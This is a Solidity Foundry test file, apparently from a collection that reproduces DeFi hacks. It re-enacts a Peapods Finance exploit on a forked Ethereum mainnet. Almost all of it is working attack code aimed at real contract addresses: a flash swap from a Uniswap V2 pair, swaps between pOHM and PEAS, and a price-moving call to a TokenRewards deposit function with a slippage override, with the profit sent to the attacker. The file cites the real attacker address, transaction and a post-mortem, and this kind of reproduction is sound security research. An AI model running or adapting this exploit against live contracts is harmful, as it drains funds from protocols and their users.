// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ $3,500
// Attacker : https://etherscan.io/address/0xedee6379fe90bd9b85d8d0b767d4a6deb0dc9dcf
// Attack Tx : https://etherscan.io/tx/0x2c1a19982aa88bee8a5d9a5dfeb406f2bfe1cfc1213f20e91d91ce3b55c86cc5

// @Analysis
// Post-mortem : https://blog.solidityscan.com/peapods-finance-hack-analysis-bdc5432107a5

address constant pOHM = 0x88E08adB69f2618adF1A3FF6CC43c671612D1ca4;
address constant PEAS = 0x02f92800F57BCD74066F5709F1Daa1A4302Df875;
address constant TokenRewards = 0x7d48D6D775FaDA207291B37E3eaA68Cc865bf9Eb;

address constant UniswapV2Pair = 0x80e9C48ec41AF7a0Ed6Cf4f3ac979f3538021608;
address constant UniswapV3Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

contract PeapodsFinance_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("mainnet", 21_800_591 - 1);

        vm.label(attacker, "Attacker");
        vm.label(pOHM, "pOHM");
        vm.label(PEAS, "PEAS");
        vm.label(TokenRewards, "TokenRewards");
        vm.label(UniswapV2Pair, "Uniswap V2: Pair");
        vm.label(UniswapV3Router, "Uniswap V3: Router");

        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("Before balance of pOHM", IERC20(pOHM).balanceOf(attacker), 18);

        vm.startPrank(attacker);
        AttackerC attC = new AttackerC(attacker);
        attC.attack();
        vm.stopPrank();

        emit log_named_decimal_uint("After balance of pOHM", IERC20(pOHM).balanceOf(attacker), 18);
    }
}

contract AttackerC {
    address attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    function attack() public {
        IUniswapV2Pair(UniswapV2Pair).swap(0, 9_420_000_000_000_000_000_000, address(this), hex"61");

        uint256 balanceOfpOHM = IERC20(pOHM).balanceOf(address(this));
        IERC20(pOHM).transfer(attacker, balanceOfpOHM);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        IERC20(pOHM).approve(UniswapV3Router, amount1);

        Uni_Router_V3.ExactInputSingleParams memory params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: pOHM,
            tokenOut: PEAS,
            fee: 10_000,
            recipient: address(this),
            deadline: block.timestamp + 100,
            amountIn: amount1,
            amountOutMinimum: 1,
            sqrtPriceLimitX96: 0
        });
        uint256 amountOut = Uni_Router_V3(UniswapV3Router).exactInputSingle(params);
        // console.log("amountOut: ", amountOut);

        ITokenRewards(TokenRewards).depositFromPairedLpToken(0, 999);

        uint256 balanceOfPEAS = IERC20(PEAS).balanceOf(address(this));
        IERC20(PEAS).approve(UniswapV3Router, balanceOfPEAS);

        Uni_Router_V3.ExactInputSingleParams memory params2 = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: PEAS,
            tokenOut: pOHM,
            fee: 10_000,
            recipient: address(this),
            deadline: block.timestamp + 100,
            amountIn: balanceOfPEAS,
            amountOutMinimum: 1,
            sqrtPriceLimitX96: 0
        });
        uint256 amountOut2 = Uni_Router_V3(UniswapV3Router).exactInputSingle(params2);
        // console.log("amountOut2: ", amountOut2);

        IERC20(pOHM).transfer(UniswapV2Pair, 9_448_345_035_105_315_947_844);
    }
}

interface ITokenRewards {
    function depositFromPairedLpToken(uint256 _amountTknDepositing, uint256 _slippageOverride) external;
}
